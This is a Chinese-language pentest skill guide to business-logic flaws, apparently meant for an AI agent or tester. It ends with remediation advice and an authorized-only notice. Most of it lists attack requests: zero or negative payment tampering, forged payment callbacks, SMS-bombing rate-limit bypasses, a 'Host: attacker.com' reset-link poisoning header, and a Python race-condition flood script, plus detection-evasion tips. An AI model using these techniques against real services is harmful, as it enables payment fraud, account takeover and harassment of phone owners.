# 业务逻辑漏洞深度测试技能

## 概述

业务逻辑漏洞是指应用程序业务流程设计/实现缺陷导致的安全问题，无法通过常规漏洞扫描器发现，需要理解业务逻辑人工测试。常见类型：0元支付、短信轰炸、验证码绕过、竞态条件（并发刷优惠券/余额）、密码重置token泄露、邀请/推荐奖励滥用、整数溢出、订单流程绕过等。

## 一、业务逻辑漏洞分类

| 类别 | 典型漏洞 |
|------|---------|
| 支付交易 | 0元支付、价格篡改、负数数量、重复支付、订单金额篡改 |
| 认证流程 | 密码重置token泄露、验证码复用、短信轰炸、验证码爆破 |
| 竞态条件 | 并发领取优惠券/积分/余额、TOCTOU、并发提现 |
| 权限/越权 | 水平越权(IDOR)、垂直越权、未授权访问后台 |
| 流程绕过 | 跳过验证步骤、修改状态码绕过、前端校验绕过 |
| 推荐/邀请 | 自邀奖励、邀请码复用、刷推荐积分 |
| 整数溢出 | 超大金额、负数数量、金额精度问题 |
| 信任客户端 | 前端传价、本地存储余额、客户端校验 |
| 业务数据泄露 | 订单号枚举、手机号遍历、用户名枚举 |
| 状态逻辑 | 订单状态篡改、重复退款、撤销后发货 |

## 二、支付与交易漏洞

### 2.1 价格/金额篡改
```
1. 直接修改价格参数：
POST /pay {"product_id":1,"price":0.01,"amount":1}  → price改为0或负数
POST /pay {"total":100,"items":[{"price":10,"qty":10}]} → 修改items价格
POST /pay {"amount":-1,"product_id":1}  → 负数支付（余额增加）

2. 数量篡改：
POST /order {"product_id":1,"quantity":-1}  → 负数数量导致总价为负
POST /order {"product_id":1,"quantity":999999999}  → 整数溢出
POST /order {"product_id":1,"quantity":0.1}  → 小数数量

3. 优惠券/折扣篡改：
POST /apply-coupon {"code":"FREE100","discount":100}  → 修改折扣值
POST /pay {"discount":999,"total":100} → total - discount = 负数
重复使用同一优惠券

4. 支付金额与订单金额不匹配：
先生成订单100元，支付时修改支付金额为0.01，支付成功后订单状态变为已支付
```

### 2.2 支付流程绕过
```http
# 支付流程：创建订单→支付→回调确认
# 1. 直接访问支付成功页/回调URL触发订单完成
GET /payment/success?order_id=123&status=success
GET /payment/callback?out_trade_no=xxx&trade_status=TRADE_SUCCESS

# 2. 修改支付状态参数
POST /order/pay {"order_id":123,"status":"PAID"}
POST /order/pay {"order_id":123,"paid":true}

# 3. 替换支付交易ID为他人成功交易ID
POST /payment/callback {"out_trade_no":"自己订单","trade_no":"他人成功支付的trade_no"}

# 4. 金额精度问题
0.1+0.2=0.30000000000000004 → 利用浮点精度
支付0.00元（微信/支付宝最小支付0.01）
支付-1元（订单额-1元，余额增加1元）

# 5. 并发支付（重复扣款/重复发货）
同时发送多个支付请求，可能导致：
- 同订单多次支付
- 同商品多次发货
- 余额只扣一次但生成多个订单
```

### 2.3 第三方支付回调伪造
```
伪造第三方支付回调请求：
1. 无签名验证：直接POST callback数据
2. 签名密钥泄露：从前端代码/配置获取签名密钥后伪造
3. 签名绕过：删除签名字段，某些SDK不验证
4. 测试环境签名key：测试环境key为公开值
5. 回调来源IP不验证：从任意IP发送回调
```

## 三、验证码与认证逻辑

### 3.1 验证码绕过
```
1. 删除验证码参数：
POST /login {"phone":"13800138000","code":"123456"} → 删除code字段
POST /login {"phone":"13800138000","code":""} → 空验证码
POST /login {"phone":"13800138000"} → 不传验证码

2. 验证码复用：
一次验证码多次使用（登录、注册、重置密码）
验证码无过期时间

3. 验证码在响应中返回：
GET /send-code?phone=13800138000 → 响应中包含code
验证码在Cookie/JS中
验证码在URL中

4. 验证码长度/复杂度不足：
4位纯数字验证码 → 10000次可爆破
6位数字 → 1000000次

5. 验证码校验后不失效：
输入正确验证码后继续使用同一验证码

6. 修改手机号不重新发送验证码：
发送验证码到自己手机号 → 提交时修改手机号为目标

7. 万能验证码：
000000 / 888888 / 123456 测试是否硬编码万能码
验证码为手机号后4位/后6位
```

### 3.2 短信/邮件轰炸
```http
# 无频率限制
POST /send-sms {"phone":"13800138000"}  → 重放无限制

# 绕过频率限制
# 1. 修改手机号格式
phone=13800138000 → phone=+8613800138000 → phone=008613800138000 → phone=8613800138000

# 2. 不同接口轰炸同一手机号
/api/send-login-code
/api/send-register-code
/api/send-reset-code
/api/send-bind-code
多个接口均可发送短信到同一手机号

# 3. 参数污染
phone=13800138000&phone=13800000001 → 绕过单手机号限制

# 4. 修改Cookie/IP（XFF头）
X-Forwarded-For: 1.1.1.1  → 每次换IP绕过IP限流

# 5. 邮件轰炸
同短信，发送注册/重置邮件到任意邮箱，无频率限制可批量发送垃圾邮件
```

### 3.3 密码重置逻辑
```
1. 重置Token泄露：
- Token在URL中（Referer泄露）
- Token可预测（时间戳/用户ID/base64编码）
- Token不过期
- 多用户使用相同Token格式

2. 修改请求中的用户/手机号：
POST /reset-password {"phone":"自己的号码","code":"收到的验证码","new_password":"x"}
→ 修改phone为受害者号码，code用自己收到的验证码，可能直接重置受害者密码

3. 修改Host头：
Host: attacker.com → 重置链接指向攻击者域名，用户点击后泄露token

4. 跳过验证码步骤：
POST /reset-password/step1 → 发送验证码
POST /reset-password/step3 → 直接到设置新密码（跳过step2验证码验证）

5. Token与用户未绑定：
获取自己重置密码的token，替换用户名/手机号为受害者的，可重置受害者密码
```

### 3.4 注册/登录逻辑
```
1. 重复注册同一用户（大小写/空格）：
admin / Admin / ADMIN / admin （空格）
不同大小写注册后可能覆盖原用户或绕过唯一性校验

2. 用户名遍历/枚举：
注册时返回"用户名已存在"/"手机号已注册"可枚举用户
登录时返回"用户不存在"/"密码错误"不同错误信息

3. 自动登录/记住我Token：
Cookie中remember_me=user_id|hash，hash可伪造
```

## 四、竞态条件（Race Condition）

### 4.1 常见竞态场景
```
1. 优惠券/积分领取：
并发发送100个领取请求 → 可能领取100张优惠券

2. 余额/提现：
并发提现请求 → 余额可能扣为负数，或多次提现

3. 秒杀/抢购：
并发下单 → 超卖（库存1，卖出100件）

4. 签到/每日奖励：
并发签到 → 多次获得奖励

5. 转账：
并发A→B转账 → A余额只扣一次，B收到多次

6. 投票/点赞：
并发请求 → 一人投多票
```

### 4.2 并发测试方法
```bash
# 1. Burp Suite Turbo Intruder
# 使用多请求并发发送

# 2. Python并发测试
import threading, requests

def race():
    requests.post("https://target.com/api/coupon/claim", cookies={"session":"xxx"})

for _ in range(50):
    threading.Thread(target=race).start()

# 3. Burp Repeater单数据包攻击（Single Packet Attack）
# 利用HTTP/2多路复用或HTTP管线化发送多个请求

# 4. Race condition工具
race-the-web
racew0ng
```

### 4.3 TOCTOU（Time of Check to Time of Use）
```
支付流程：检查余额→扣余额→发货 → 检查和扣减之间竞态
文件上传：检查扩展名→移动文件 → 检查和移动之间替换文件
```

## 五、越权与访问控制

### 5.1 水平越权
（详见idor-testing技能）
- 修改资源ID访问他人数据
- 修改订单/用户/文件ID
- 未授权对象访问

### 5.2 垂直越权
```
1. 前端隐藏但后端不校验：
普通用户直接访问/admin API（仅前端隐藏按钮，后端无权限校验）

2. API版本差异：
/api/v1/admin/users → v1无权限检查

3. 路径遍历：
/api/user/../admin/users → 路径解析到admin

4. HTTP方法：
GET /api/admin/users → 普通用户可用GET列出用户
PUT /api/user/1/role → 修改自己的角色为admin

5. 修改权限字段（批量分配）：
PUT /api/profile {"name":"test","role":"admin","is_admin":true}
```

### 5.3 未认证接口
```
- /api/admin/backup  无认证可下载数据库备份
- /api/internal/*   内部接口未加认证
- /api/debug/*      调试接口暴露
- /actuator/*       Spring Boot Actuator
- /console          Web控制台
- /swagger-ui.html  API文档泄露
- /graphql          GraphQL端点无认证
```

## 六、信任客户端漏洞

### 6.1 价格/数量来自前端
```javascript
// 前端JS计算价格提交，后端不重新计算
POST /order {"product_id":1,"price":99,"qty":2,"total":198}
→ 修改price=0.01，total=0.01

// 加密但密钥在前端
var price = encrypt(99, "hardcoded_key");  // key在JS中可提取
```

### 6.2 本地存储关键数据
```
- 余额/积分/会员状态存储在localStorage
- 购物车价格存在Cookie中
- JWT中的role字段客户端可篡改
```

### 6.3 仅前端校验
```
- 手机号格式校验仅在JS，后端不校验（可注入）
- 文件扩展名仅前端校验（可抓包绕过）
- 支付完成仅前端跳转，后端依赖前端回调
```

## 七、整数溢出与精度问题

### 7.1 整数溢出
```
quantity=9999999999 * price=100 = 超大数溢出为0或负数
type=maximum在大多数语言：
- int32: 最大2,147,483,647
- int64: 最大9,223,372,036,854,775,807

POST /order {"product_id":1,"quantity":2147483648}  → 溢出为负数
POST /transfer {"to":"x","amount":99999999999999}  → 溢出
```

### 7.2 浮点数精度
```
0.1+0.2=0.30000000000000004  → 利用精度差
金额计算使用float/double而非BigDecimal
0元支付最小金额边界（0.00/0.01）
```

### 7.3 负数/零值
```
quantity: -100 → 总价为负，反向加余额
quantity: 0 → 0元下单
price: -999 → 折扣滥用
discount: 100% → 0元
```

## 九、订单流程漏洞

### 9.1 订单状态篡改
```
正常流程：待支付→已支付→已发货→已完成
POST /order/status {"order_id":123,"status":"completed"} → 直接改为已完成
POST /order/status {"order_id":123,"status":"refunded"} → 退款
```

### 9.2 收货地址/信息修改
```
- 支付后修改收货地址为攻击者地址
- 修改订单中的商品信息
- 货到付款修改商品/数量
```

### 9.3 退款/售后逻辑
```
- 重复退款（并发）
- 退款金额大于支付金额
- 退货后不退回商品只退款
- 发货后申请退款不退货
- 修改退款状态
```

## 十、信息泄露

### 10.1 数据遍历
```
订单号顺序递增 → 遍历订单号获取所有订单信息
用户ID顺序递增 → 遍历用户资料
手机号/邮箱通过注册接口枚举
工单号/发票号顺序 → 业务数据量泄露
```

### 10.2 响应信息泄露
```
- 错误堆栈信息
- SQL错误信息
- 调试信息
- 内部IP/域名
- 第三方API密钥
- 敏感字段未掩码（完整手机号/身份证/银行卡）
```

## 十一、WAF/防护绕过

业务逻辑漏洞通常不涉及注入类Payload，WAF防护较少，但仍需：
```
- 并发测试时调整速率，不触发限流
- 手机号/邮箱格式变形绕过格式校验
- 参数名大小写/变体绕过字段检查
- Content-Type切换绕过
- XFF绕过IP限流
- 分阶段测试（每步间隔时间）避免异常检测
```

## 十四、修复建议

- **服务端重新计算**：价格/金额/折扣一律服务端计算，不信任前端
- **事务/锁机制**：涉及余额/库存操作使用数据库事务+行锁/乐观锁，防止竞态
- **验证码安全**：验证码绑定手机号/会话、一次性使用、设置过期时间、频率限制
- **Token绑定**：重置Token绑定用户、短过期时间、使用后失效
- **流程状态机**：严格状态转换，不允许跳步/回退
- **金额校验**：金额使用BigDecimal/整数（分），禁止负数，校验范围
- **权限检查**：每个API端点独立做对象级/功能级授权
- **限流**：接口IP+用户维度限流，防止轰炸/爆破
- **审计日志**：关键操作（支付/退款/改密）记录日志
- **错误处理**：统一错误信息，不泄露具体原因
- **签名验证**：第三方支付回调严格验证签名+IP白名单
- **幂等性**：支付等关键接口支持幂等性防止重复提交

## 注意事项

- **仅限授权测试**：业务逻辑测试可能影响真实交易/数据，严格在测试环境或授权范围内测试
- **避免真实交易**：支付测试使用测试金额/测试账户，不要产生真实交易
- **并发测试谨慎**：竞态条件测试可能导致数据不一致，提前备份数据
- **数据清理**：测试产生的订单/优惠券/账户及时清理
- **不要破坏业务**：不执行删除/篡改真实用户数据的操作
- **合规要求**：遵守《网络安全法》《数据安全法》《个人信息保护法》
- **业务理解优先**：业务逻辑漏洞必须先理解业务流程才能发现，先梳理流程再测试
